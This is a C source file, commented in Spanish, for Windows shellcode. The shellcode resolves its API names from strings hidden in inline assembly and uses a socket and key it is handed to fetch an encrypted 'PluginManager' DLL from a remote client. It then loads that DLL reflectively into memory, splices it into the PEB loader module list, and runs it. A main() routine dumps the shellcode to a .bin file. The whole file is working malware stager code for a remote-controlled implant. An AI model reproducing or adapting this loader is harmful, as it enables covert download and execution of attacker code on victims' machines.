﻿#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include "main.h"

void __declspec(naked) Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
    __asm{
        jmp scInit
    }
}

void *MyRealloc(SHELLCODE_CONTEXT *pSCC, void *ptr, size_t size){
    //Funcion para relocalizar o localizar el array de modules
	if (NULL == ptr)
		return pSCC->RtlAllocateHeap_(pSCC->GetProcessHeap_(), 0, size);
	else
		return pSCC->RtlReAllocateHeap_(pSCC->GetProcessHeap_(), 0, ptr, size);
}

void CopySections(SHELLCODE_CONTEXT *pSCC, const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module){
	int i, size;
	unsigned char *codeBase = module->codeBase;
	unsigned char *dest;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);

    //Recorremos cada seccion
	for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++){
        //Aunque no tenga datos inicializados hay que crear sitio en memoria...
		if (section->SizeOfRawData == 0){
			size = old_headers->OptionalHeader.SectionAlignment;
            //... solo si hubiese que alinear
			if (size > 0){
				dest = (unsigned char *)pSCC->VirtualAlloc_(codeBase + section->VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE);
				section->Misc.PhysicalAddress = (DWORD)dest;
                //Nos aseguramos que quede a 0s
				pSCC->memset_(dest, 0, size);
			}
            //Siguiente seccion
			continue;
		}

		// Creamos bloque de memoria y copiamos los valores
		dest = (unsigned char *)pSCC->VirtualAlloc_(codeBase + section->VirtualAddress, section->SizeOfRawData, MEM_COMMIT, PAGE_READWRITE);
		pSCC->memcpy_(dest, data + section->PointerToRawData, section->SizeOfRawData);
        //Guardamos la direccion
		section->Misc.PhysicalAddress = (DWORD)dest;
	}
}

//Protegemos las paginas de memoria segun corresponda
void FinalizeSections(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
	int i;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(module->headers);
	int ProtectionFlags[2][2][2] = {
		{
			//No ejecutable
			{PAGE_NOACCESS, PAGE_WRITECOPY},
			{PAGE_READONLY, PAGE_READWRITE},
		}, {
			//Ejecutable
			{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
			{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
		},
	};

	
	//Recorremos las secciones
	for (i=0; i<module->headers->FileHeader.NumberOfSections; i++, section++){
		DWORD protect, oldProtect, size;
		BOOL executable = ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0);
		BOOL readable   = ((section->Characteristics & IMAGE_SCN_MEM_READ) != 0);
		BOOL writeable  = ((section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0);

        //Si la memoria no se necesita la liberamos libremente
		if (section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE){
			pSCC->VirtualFree_((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, MEM_DECOMMIT);
			continue;
		}

		//Determinamos el tipo de proteccion
		protect = ProtectionFlags[executable][readable][writeable];
		if (section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
			protect |= PAGE_NOCACHE;

		//Obtenemos el tamaño de la seccion en disco
		size = section->SizeOfRawData;
        //Si el tamaño es cero tal vez...
		if (size == 0){
            //... se trata de data inicializada
			if (section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)
				size = module->headers->OptionalHeader.SizeOfInitializedData;
            //... o no
			else if (section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA)
				size = module->headers->OptionalHeader.SizeOfUninitializedData;
		}

        //Ahora cambiamos el acceso
		if (size > 0)
			pSCC->VirtualProtect_((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, &oldProtect);
	}
}

void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta){
	DWORD i;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    //Comprobamos si hay reloc
	if (directory->Size > 0){
        //Obtenemos el dir
		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)(codeBase + directory->VirtualAddress);

        //Mientras haya bloque de relocalizacion
		while(relocation->VirtualAddress > 0){
            //Obtenemos el puntero absoluto
			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + sizeof(IMAGE_BASE_RELOCATION));

			for (i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2); i++, relInfo++){
				DWORD *patchAddrHL;
				int type, offset;

				//Los 4 bits superiores establecen el tipo de relocalizacion
				type = *relInfo >> 12;
				//y los 12 inferiores el offset
				offset = *relInfo & 0xfff;
				
				if (type == IMAGE_REL_BASED_HIGHLOW){
					//Actualizamos los 32bits
					patchAddrHL = (DWORD *)(dest + offset);
					*patchAddrHL += delta;
                }
			}

			//Siguiente bloque
			relocation = (PIMAGE_BASE_RELOCATION)(((DWORD)relocation) + relocation->SizeOfBlock);
		}
	}
}

//Rellenamos la IAT
BOOL BuildImportTable(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
	unsigned char *codeBase = module->codeBase;

    //Comprobamos que haya import
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (directory->Size > 0){
        //Cargamos el dir
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);
        //Mientras podamos leer el nombre de la DLL y el descriptor...
		while(!pSCC->IsBadReadPtr_(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name){
			DWORD *thunkRef, *funcRef;
            //Cargamos la DLL
			HMODULE handle = pSCC->LoadLibraryA_((LPCSTR)(codeBase + importDesc->Name));
            //Si no hemos podido cargar la DLL salimos
			if (handle == INVALID_HANDLE_VALUE)
				return false;
            //Añadimos el handle a nuestro array
			module->modules = (HMODULE *)MyRealloc(pSCC, module->modules, (module->numModules+1)*(sizeof(HMODULE)));
            //Si no hemos podido crear hueco para el handle
			if (module->modules == NULL)
			    return false;
            //Guardamos el handle
			module->modules[module->numModules++] = handle;

			if (importDesc->OriginalFirstThunk){
				thunkRef = (DWORD *)(codeBase + importDesc->OriginalFirstThunk);
				funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			}else{
				//Si no hay hint table ambos son el mismo
				thunkRef = (DWORD *)(codeBase + importDesc->FirstThunk);
				funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			}
            //Mientras tengamos un thunk que leer...
			while(*thunkRef){
				if IMAGE_SNAP_BY_ORDINAL(*thunkRef){
                    //Si se trata de un ordinal
					*funcRef = (DWORD)pSCC->GetProcAddressA_(handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
                }else{
                    //Si no es un ordinal cargamos por nombre
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
					*funcRef = (DWORD)pSCC->GetProcAddressA_(handle, (LPCSTR)&thunkData->Name);
				}
                //Si no hemos podido sacar el puntero salimos
				if (*funcRef == 0)
					return false;

                //Siguientes bloques
                thunkRef++;
                funcRef++;
			}
            //Siguiente descriptor
            importDesc++;
		}
	}
    //Todo correcto
	return true;
}

void NotifyTls(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, BOOL State){
    PIMAGE_DATA_DIRECTORY tls_dd    = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_TLS);
    DWORD tls_index;
    PBYTE buffer;

    //Si existe un directorio de TLS...
    if (tls_dd->Size > 0){
        PIMAGE_TLS_DIRECTORY tls_dir= (PIMAGE_TLS_DIRECTORY)(tls_dd->VirtualAddress + module->codeBase);
        if(State == true){
            //Definimos un indice
            tls_index = pSCC->TlsAlloc_();
            *((DWORD*)(tls_dir->AddressOfIndex)) = tls_index;
            //Hacemos sitio en memoria
            buffer = (PBYTE)pSCC->malloc__(tls_dir->EndAddressOfRawData - tls_dir->StartAddressOfRawData);

            //Copiamos el TLS al buffer
            pSCC->memcpy_(buffer, (PDWORD)tls_dir->StartAddressOfRawData, tls_dir->EndAddressOfRawData-tls_dir->StartAddressOfRawData);
            //Asignamos el puntero
            pSCC->TlsSetValue_(tls_index, buffer);
        }

        //Notificamos a los callbacks
        PIMAGE_TLS_CALLBACK *tls_cb = (PIMAGE_TLS_CALLBACK*)tls_dir->AddressOfCallBacks;
        while(*tls_cb){
            (*tls_cb)(module->codeBase, (DWORD)State, 0);
            tls_cb++;
        }

        if(State == false){
            //Leemos el indice
            tls_index = *((DWORD*)tls_dir->AddressOfIndex);
            //Limpiamos memoria
            pSCC->free_(pSCC->TlsGetValue_(tls_index));
            //Liberamos el indice
            pSCC->TlsFree_(tls_index);
        }
    }
}

void AddToModules(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module, LPCWSTR name){
    //Creamos la estructura
    module->ldr_mod = (PLDR_MODULE)pSCC->malloc__(sizeof(LDR_MODULE));

    //Asignamos valores generales
    module->ldr_mod->TlsIndex  = pSCC->TlsAlloc_();
    module->ldr_mod->DllBase = module->codeBase;
    module->ldr_mod->SizeOfImage = module->headers->OptionalHeader.SizeOfImage;
    module->ldr_mod->EntryPoint = (PVOID)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
    module->ldr_mod->LoadCount = 1;
    module->ldr_mod->SectionPointer = (PVOID)-1;
    module->ldr_mod->CheckSum = module->headers->OptionalHeader.CheckSum;
    module->ldr_mod->TimeDateStamp = module->headers->FileHeader.TimeDateStamp;
    module->ldr_mod->Flags = LDR_WINE_INTERNAL | LDR_ENTRY_PROCESSED | LDR_LOAD_IN_PROGRESS;

    DWORD name_size = 0;
    //Calculamos el tamaño del nombre
    while(name[++name_size]!=0){}

    //Añadimos el nombre de la DLL
    module->ldr_mod->FullDllName.Length = name_size;
    module->ldr_mod->FullDllName.MaximumLength = name_size;
    module->ldr_mod->FullDllName.Buffer = (PWSTR)name;
    module->ldr_mod->BaseDllName.Length = name_size;
    module->ldr_mod->BaseDllName.MaximumLength = name_size;
    module->ldr_mod->BaseDllName.Buffer = (PWSTR)name;

    //Añadimos nuestro modulo a la cadena de modulos cargados
    PPEB_LDR_DATA   ldr_data;
    PLIST_ENTRY     prev, last;

    //Obtenemos PEB_LDR_DATA
    __asm{
        xor eax, eax
        mov eax, FS:[eax+0x30]
        mov eax, [eax+0x0C]
        mov [ldr_data], eax
    }

    //Linkeamos nuestro LDR_MODULE
    last = ldr_data->InLoadOrderModuleList.Flink;
    prev = last->Blink;
    last->Blink = (PLIST_ENTRY)module->ldr_mod;
    prev->Flink = (PLIST_ENTRY)module->ldr_mod;
    module->ldr_mod->InLoadOrderLinks.Blink = prev;
    module->ldr_mod->InLoadOrderLinks.Flink = last;
}

PMEMORYMODULE LoadLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, const void *data, LPCWSTR dllname){
	PMEMORYMODULE       result;
	PIMAGE_DOS_HEADER   dos_header;
	PIMAGE_NT_HEADERS   old_header;
	unsigned char       *code;
    unsigned char       *headers;
	DWORD               locationDelta;
	DllEntryProc        DllEntry;
	BOOL                successfull;


	dos_header = (PIMAGE_DOS_HEADER)data;
	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
	code = (unsigned char *)pSCC->VirtualAlloc_((LPVOID)(old_header->OptionalHeader.ImageBase), old_header->OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
	
    //Si no podemos reservar memoria en el puntero que indica el PE...
	if (code == NULL)
		//... lo intentamos en una posicion arbitraria
		code = (unsigned char *)pSCC->VirtualAlloc_(NULL, old_header->OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
    //... si aun asi no conseguimos memoria...
	if (code == NULL)
        //...salimos
		return NULL;

    //Reservamos nuestro array
	result = (PMEMORYMODULE)pSCC->RtlAllocateHeap_(pSCC->GetProcessHeap_(), 0, sizeof(MEMORYMODULE));

    //Asignamos parte de informacion a nuestra estructura
	result->codeBase = code;
	result->numModules = 0;
	result->modules = NULL;
	result->initialized = 0;

	//Hacemos commit de la memoria
	pSCC->VirtualAlloc_(code, old_header->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);

	//Obtenemos bloque de memoria para los headers
	headers = (unsigned char *)pSCC->VirtualAlloc_(code, old_header->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);
	
	//Copiamos el header
	pSCC->memcpy_(headers, dos_header, dos_header->e_lfanew + old_header->OptionalHeader.SizeOfHeaders);
    //Almacemos los headers en nuestra estructura
	result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[dos_header->e_lfanew];

	//Actualizamos el ImageBase del PE
	result->headers->OptionalHeader.ImageBase = (DWORD)code;

	//Copiamos las secciones
	CopySections(pSCC, (const unsigned char *)data, old_header, result);

    // Añadimos la DLL a la lista de módulos
    AddToModules(pSCC, result, dllname);

	//Obtenemos el Delta para el reloc
	if ((locationDelta = (DWORD)(code - old_header->OptionalHeader.ImageBase)) != 0)
        //Si es distinto a 0 vemos si hay que aplicar reloc
		PerformBaseRelocation(result, locationDelta);

	//Cargamos los imports
	if (!BuildImportTable(pSCC, result))
        //Si ha habido algun problema mejor salir
		return NULL;

	//Asignamos permisos y eliminamos secciones de ser necesario
	FinalizeSections(pSCC, result);

    //Cargamos y notificamos a los TLS
    NotifyTls(pSCC, result, true);

	//Obtenemos el EP
	if (result->headers->OptionalHeader.AddressOfEntryPoint != 0){
        //Obtenemos la direccion absoluta
		DllEntry = (DllEntryProc)(code + result->headers->OptionalHeader.AddressOfEntryPoint);

		//Notificamos la carga
		successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);
		if (!successfull)
			return NULL;
	}

	return (PMEMORYMODULE)result;
}

void FreeLibraryFromMemory(SHELLCODE_CONTEXT *pSCC, PMEMORYMODULE module){
    //Notificamos que vamos a descargar la libreria
    if (module->headers->OptionalHeader.AddressOfEntryPoint != 0){
        DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
	    if (DllEntry != 0)
	        (*DllEntry)((HINSTANCE)(module->codeBase), DLL_PROCESS_DETACH, 0);
    }

    //Notificamos y descargamos los Tls
    NotifyTls(pSCC, module, false);

    //Desvinculamos el modulo
    PLIST_ENTRY next, prev;
    pSCC->TlsFree_(module->ldr_mod->TlsIndex);
    next = ((PLIST_ENTRY)module->ldr_mod)->Flink;
    prev = ((PLIST_ENTRY)module->ldr_mod)->Blink;
    next->Blink = prev;
    prev->Flink = next;

    //Liberamos la memoria
    pSCC->VirtualFree_(module->codeBase, module->headers->OptionalHeader.SizeOfImage, MEM_RELEASE);

    //Liberamos cada DLL cargada
    for(int i=0; i<module->numModules;i++){
        pSCC->FreeLibrary_(module->modules[i]);
    }
}


void Payload(SHELLCODE_CONTEXT *scc){
    //Enviamos el OK al cliente.
    char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
    DWORD dwDSize   = 15;
    scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));

    scc->send_(scc->hSocket, ok, sizeof(ok), 0);

    //Recibimos el tamaño del PluginManager
    DWORD dwSize    = 0;
    if ((scc->recv_(scc->hSocket, (char*)&dwSize, sizeof(DWORD), 0) == 4)&&(dwSize > 0)){   //Si lo que hemos recibido es un DWORD y nos han aceptado el OK...
        //Hacemos sitio para almacenar el PluginManager
        char* bBuff = (char*)scc->malloc__(dwSize);
        if (bBuff > 0){
            DWORD dwASize   = dwSize;
            DWORD lResult   = 0;
            bool  bReceived = true;

            //Recibimos el PluginManager
            while ((dwASize > 0) && (bReceived==true)){
                lResult = scc->recv_(scc->hSocket, (char*)(bBuff+(dwSize-dwASize)), dwASize, 0);
                dwASize -= lResult;
                if(lResult <= 0)
                    bReceived = false;
            }
            dwDSize = dwSize;

            //Lo desciframos
            if ((bReceived==true)&&(scc->CryptDecrypt_(scc->hKey, 0, true, 0, (BYTE*)bBuff, &dwDSize) == 1)){
                //Procedemos a comprobar el Checksum
                DWORD oChecksum = *(DWORD*)bBuff;
                //Saltamos el Checksum de los datos recibidos
                bBuff += 4;
                DWORD nChecksum = 0;

                for(DWORD i = 0; i < dwSize-4;i++){
                    nChecksum ^= (BYTE)bBuff[i];
                    nChecksum *= 0x1EF30EB;
                };

                //Si el checksum coincide
                if (nChecksum == oChecksum){
                    //Cargamos y ejecutamos el PluginManager
                    WCHAR sDLLName[]    = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
                    char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '1', '2', '\0'};
                    
                    PMEMORYMODULE PM_Mod;
                    //Si hemos podido cargar el PM...
                    if ((PM_Mod = LoadLibraryFromMemory(scc, bBuff, sDLLName))){
                        //Creamos la estructura que recibe
                        typedef int (WINAPI *InitPluginLoader)(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable& lFunc);
                        InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddressA_((HMODULE)PM_Mod->codeBase, sPMEntry);
                        if (MainFunc){
                            LoaderFunTable LFT;
                            LFT.FLFM                    = (FreeLibraryFromMemory_)((PBYTE)FreeLibraryFromMemory);
                            LFT.LLFM                    = (LoadLibraryFromMemory_)((PBYTE)LoadLibraryFromMemory);
                            LFT.GetProcAddress          = (unsigned long**)scc->GetProcAddressA_;
                            LFT.LoadLibraryA            = (unsigned long**)scc->LoadLibraryA_;
                            //y ejecutamos el Main
                            MainFunc(scc->hSocket, scc->hKey, LFT);
                        }
                        //Si el PM nos retorna la ejecución descargamos la DLL de memoria
                        FreeLibraryFromMemory(scc, PM_Mod);
                        //y eliminamos el buffer
                        scc->free_(bBuff - 4);
                    }
                }
            }
        }
    }
    return;
}

void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
    LPCSTR              Strings;

#pragma region cadenas
    __asm{
        call over_strings
#define sNTDLL (LPCSTR)((PBYTE)Strings + 0)
		__emit 'N'
		__emit 'T'
		__emit 'D'
		__emit 'L'
		__emit 'L'
		__emit 0


#define smemset (LPCSTR)((PBYTE)Strings + 6)
		__emit 'm'
		__emit 'e'
		__emit 'm'
		__emit 's'
		__emit 'e'
		__emit 't'
		__emit 0


#define smemcpy (LPCSTR)((PBYTE)Strings + 13)
		__emit 'm'
		__emit 'e'
		__emit 'm'
		__emit 'c'
		__emit 'p'
		__emit 'y'
		__emit 0


#define sRtlAllocateHeap (LPCSTR)((PBYTE)Strings + 20)
		__emit 'R'
		__emit 't'
		__emit 'l'
		__emit 'A'
		__emit 'l'
		__emit 'l'
		__emit 'o'
		__emit 'c'
		__emit 'a'
		__emit 't'
		__emit 'e'
		__emit 'H'
		__emit 'e'
		__emit 'a'
		__emit 'p'
		__emit 0


#define sRtlReAllocateHeap (LPCSTR)((PBYTE)Strings + 36)
		__emit 'R'
		__emit 't'
		__emit 'l'
		__emit 'R'
		__emit 'e'
		__emit 'A'
		__emit 'l'
		__emit 'l'
		__emit 'o'
		__emit 'c'
		__emit 'a'
		__emit 't'
		__emit 'e'
		__emit 'H'
		__emit 'e'
		__emit 'a'
		__emit 'p'
		__emit 0


#define sKERNEL32 (LPCSTR)((PBYTE)Strings + 54)
		__emit 'K'
		__emit 'E'
		__emit 'R'
		__emit 'N'
		__emit 'E'
		__emit 'L'
		__emit '3'
		__emit '2'
		__emit 0


#define sFreeLibrary (LPCSTR)((PBYTE)Strings + 63)
		__emit 'F'
		__emit 'r'
		__emit 'e'
		__emit 'e'
		__emit 'L'
		__emit 'i'
		__emit 'b'
		__emit 'r'
		__emit 'a'
		__emit 'r'
		__emit 'y'
		__emit 0


#define sTlsAlloc (LPCSTR)((PBYTE)Strings + 75)
		__emit 'T'
		__emit 'l'
		__emit 's'
		__emit 'A'
		__emit 'l'
		__emit 'l'
		__emit 'o'
		__emit 'c'
		__emit 0


#define sTlsFree (LPCSTR)((PBYTE)Strings + 84)
		__emit 'T'
		__emit 'l'
		__emit 's'
		__emit 'F'
		__emit 'r'
		__emit 'e'
		__emit 'e'
		__emit 0


#define sTlsSetValue (LPCSTR)((PBYTE)Strings + 92)
		__emit 'T'
		__emit 'l'
		__emit 's'
		__emit 'S'
		__emit 'e'
		__emit 't'
		__emit 'V'
		__emit 'a'
		__emit 'l'
		__emit 'u'
		__emit 'e'
		__emit 0


#define sTlsGetValue (LPCSTR)((PBYTE)Strings + 104)
		__emit 'T'
		__emit 'l'
		__emit 's'
		__emit 'G'
		__emit 'e'
		__emit 't'
		__emit 'V'
		__emit 'a'
		__emit 'l'
		__emit 'u'
		__emit 'e'
		__emit 0


#define sVirtualAlloc (LPCSTR)((PBYTE)Strings + 116)
		__emit 'V'
		__emit 'i'
		__emit 'r'
		__emit 't'
		__emit 'u'
		__emit 'a'
		__emit 'l'
		__emit 'A'
		__emit 'l'
		__emit 'l'
		__emit 'o'
		__emit 'c'
		__emit 0


#define sVirtualFree (LPCSTR)((PBYTE)Strings + 129)
		__emit 'V'
		__emit 'i'
		__emit 'r'
		__emit 't'
		__emit 'u'
		__emit 'a'
		__emit 'l'
		__emit 'F'
		__emit 'r'
		__emit 'e'
		__emit 'e'
		__emit 0


#define sVirtualProtect (LPCSTR)((PBYTE)Strings + 141)
		__emit 'V'
		__emit 'i'
		__emit 'r'
		__emit 't'
		__emit 'u'
		__emit 'a'
		__emit 'l'
		__emit 'P'
		__emit 'r'
		__emit 'o'
		__emit 't'
		__emit 'e'
		__emit 'c'
		__emit 't'
		__emit 0


#define sGetProcessHeap (LPCSTR)((PBYTE)Strings + 156)
		__emit 'G'
		__emit 'e'
		__emit 't'
		__emit 'P'
		__emit 'r'
		__emit 'o'
		__emit 'c'
		__emit 'e'
		__emit 's'
		__emit 's'
		__emit 'H'
		__emit 'e'
		__emit 'a'
		__emit 'p'
		__emit 0


#define sIsBadReadPtr (LPCSTR)((PBYTE)Strings + 171)
		__emit 'I'
		__emit 's'
		__emit 'B'
		__emit 'a'
		__emit 'd'
		__emit 'R'
		__emit 'e'
		__emit 'a'
		__emit 'd'
		__emit 'P'
		__emit 't'
		__emit 'r'
		__emit 0


#define sWS2_32 (LPCSTR)((PBYTE)Strings + 184)
		__emit 'W'
		__emit 'S'
		__emit '2'
		__emit '_'
		__emit '3'
		__emit '2'
		__emit 0


#define ssend (LPCSTR)((PBYTE)Strings + 191)
		__emit 's'
		__emit 'e'
		__emit 'n'
		__emit 'd'
		__emit 0


#define srecv (LPCSTR)((PBYTE)Strings + 196)
		__emit 'r'
		__emit 'e'
		__emit 'c'
		__emit 'v'
		__emit 0


#define sADVAPI32 (LPCSTR)((PBYTE)Strings + 201)
		__emit 'A'
		__emit 'D'
		__emit 'V'
		__emit 'A'
		__emit 'P'
		__emit 'I'
		__emit '3'
		__emit '2'
		__emit 0


#define sCryptDecrypt (LPCSTR)((PBYTE)Strings + 210)
		__emit 'C'
		__emit 'r'
		__emit 'y'
		__emit 'p'
		__emit 't'
		__emit 'D'
		__emit 'e'
		__emit 'c'
		__emit 'r'
		__emit 'y'
		__emit 'p'
		__emit 't'
		__emit 0


#define sCryptEncrypt (LPCSTR)((PBYTE)Strings + 223)
		__emit 'C'
		__emit 'r'
		__emit 'y'
		__emit 'p'
		__emit 't'
		__emit 'E'
		__emit 'n'
		__emit 'c'
		__emit 'r'
		__emit 'y'
		__emit 'p'
		__emit 't'
		__emit 0


#define sMSVCRT (LPCSTR)((PBYTE)Strings + 236)
		__emit 'M'
		__emit 'S'
		__emit 'V'
		__emit 'C'
		__emit 'R'
		__emit 'T'
		__emit 0


#define smalloc (LPCSTR)((PBYTE)Strings + 243)
		__emit 'm'
		__emit 'a'
		__emit 'l'
		__emit 'l'
		__emit 'o'
		__emit 'c'
		__emit 0


#define sfree (LPCSTR)((PBYTE)Strings + 250)
		__emit 'f'
		__emit 'r'
		__emit 'e'
		__emit 'e'
		__emit 0
over_strings:
        pop  eax
        mov  [Strings], eax
    }
#pragma endregion

    SHELLCODE_CONTEXT*  scc = (SHELLCODE_CONTEXT*)((_malloc)pGPA(pLoadLibA(sMSVCRT), smalloc))(sizeof(SHELLCODE_CONTEXT));

    scc->NTDLL              = pLoadLibA(sNTDLL);
    scc->memcpy_            = (_memcpy)pGPA(scc->NTDLL, smemcpy);
    scc->memset_            = (_memset)pGPA(scc->NTDLL, smemset);
    scc->RtlAllocateHeap_   = (_RtlAllocateHeap)pGPA(scc->NTDLL, sRtlAllocateHeap);
    scc->RtlReAllocateHeap_ = (_RtlReAllocateHeap)pGPA(scc->NTDLL, sRtlReAllocateHeap);

    scc->KERNEL32           = pLoadLibA(sKERNEL32);
    scc->FreeLibrary_       = (_FreeLibrary)pGPA(scc->KERNEL32, sFreeLibrary);
    scc->VirtualAlloc_      = (_VirtualAlloc)pGPA(scc->KERNEL32, sVirtualAlloc);
    scc->VirtualFree_       = (_VirtualFree)pGPA(scc->KERNEL32, sVirtualFree);
    scc->VirtualProtect_    = (_VirtualProtect)pGPA(scc->KERNEL32, sVirtualProtect);
    scc->GetProcessHeap_    = (_GetProcessHeap)pGPA(scc->KERNEL32, sGetProcessHeap);
    scc->IsBadReadPtr_      = (_IsBadReadPtr)pGPA(scc->KERNEL32, sIsBadReadPtr);
    scc->TlsAlloc_          = (_TlsAlloc)pGPA(scc->KERNEL32, sTlsAlloc);
    scc->TlsFree_           = (_TlsFree)pGPA(scc->KERNEL32, sTlsFree);
    scc->TlsSetValue_       = (_TlsSetValue)pGPA(scc->KERNEL32, sTlsSetValue);
    scc->TlsGetValue_       = (_TlsGetValue)pGPA(scc->KERNEL32, sTlsGetValue);

    scc->WS2_32             = pLoadLibA(sWS2_32);
    scc->send_              = (_send)pGPA(scc->WS2_32, ssend);
    scc->recv_              = (_recv)pGPA(scc->WS2_32, srecv);

    scc->ADVAPI32           = pLoadLibA(sADVAPI32);
    scc->CryptDecrypt_      = (_CryptDecrypt)pGPA(scc->ADVAPI32, sCryptDecrypt);
    scc->CryptEncrypt_      = (_CryptEncrypt)pGPA(scc->ADVAPI32, sCryptEncrypt);

    scc->MSVCRT             = pLoadLibA(sMSVCRT);
    scc->malloc__           = (_malloc)pGPA(scc->MSVCRT, smalloc);
    scc->free_              = (_free)pGPA(scc->MSVCRT, sfree);

    scc->LoadLibraryA_      = pLoadLibA;
    scc->GetProcAddressA_   = pGPA;
    scc->hSocket            = hSocket;
    scc->hKey               = hKEY;

    Payload(scc);
    scc->free_(scc);

    __asm{
        leave 
        ret 0x10
    }
    return;
}


//Código utilizado para generar ".bin" y debuggear la shellcode
int main(int argc, char **argv){
    FILE *pfBin;
    size_t dwSize;
    char szBinFile[MAX_PATH];

    dwSize = (PBYTE)main - (PBYTE)Start;

    sprintf_s(szBinFile, MAX_PATH, "%s.bin", argv[0]);
    
    fopen_s(&pfBin, szBinFile, "wb");
    fwrite((PBYTE)Start, dwSize, 1, pfBin);
    fclose(pfBin);

    //Start(&LoadLibraryA_, &GetProcAddress_, 0, 0);

    return 0;
}